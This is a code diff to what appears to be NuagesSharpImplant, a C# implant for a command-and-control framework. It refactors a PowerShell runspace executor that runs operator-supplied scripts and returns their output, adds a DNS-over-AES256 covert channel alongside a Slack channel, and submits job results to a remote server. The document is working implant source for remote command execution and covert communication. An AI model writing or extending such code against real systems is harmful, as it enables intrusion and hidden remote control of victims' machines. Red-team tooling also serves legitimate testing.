@@ -2,13 +2,11 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Net;
-using System.Management.Automation;
-using System.Management.Automation.Runspaces;
 using System.Text;
-using System.Collections.ObjectModel;
 using System.Reflection;
 using System.Net.Sockets;
 using System.Json;
+using NuagesSharpImplant.Connections;
 
 namespace NuagesSharpImplant
 {
@@ -148,33 +146,6 @@ namespace NuagesSharpImplant
             }
         }
 
-        public string posh(string cmd)
-        {
-            try
-            {
-                Runspace runspace = RunspaceFactory.CreateRunspace();
-                runspace.Open();
-                Pipeline pipeline = runspace.CreatePipeline();
-                pipeline.Commands.AddScript(cmd);
-                pipeline.Commands.Add("Out-String");
-                Collection<PSObject> results = pipeline.Invoke();
-                StringBuilder stringBuilder = new StringBuilder();
-                foreach (PSObject obj in results)
-                {
-                    foreach (string line in obj.ToString().Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None))
-                    {
-                        stringBuilder.AppendLine(line.TrimEnd());
-                    }
-                }
-                runspace.Close();
-                return stringBuilder.ToString();
-            }
-            catch (Exception e)
-            {
-                string errorText = e.Message + "\n";
-                return (errorText);
-            }
-        }
 
         public void do_command(JsonObject job) {
             string jobId = job["_id"];
@@ -276,6 +247,12 @@ namespace NuagesSharpImplant
             {
 
                 con = new SLACKAES256Connection(handler_args[1], handler_args[2], handler_args[3], handler_args[4], this.connector.getBufferSize(), this.connector.getRefreshRate());
+
+            }
+            else if (handler_args[0].ToLower() == "dnsaes256")
+            {
+
+                con = new DNSAES256Connection(handler_args[1], handler_args[2], this.connector.getBufferSize(), this.connector.getRefreshRate());
 
             }
             else if (handler_args[0].ToLower() == "multi")
@@ -392,7 +369,7 @@ namespace NuagesSharpImplant
                 script = "";
             }
             script += "\r\n" + command;
-            string result = this.posh(script);
+            string result = Utils.Posh.posh(script);
             SubmitJobResult(jobId, result, false);
 
         }
@@ -824,7 +801,7 @@ namespace NuagesSharpImplant
                         }
                     }
                 }
-                catch (Exception)
+                catch (Exception e)
                 {
                 }
             }
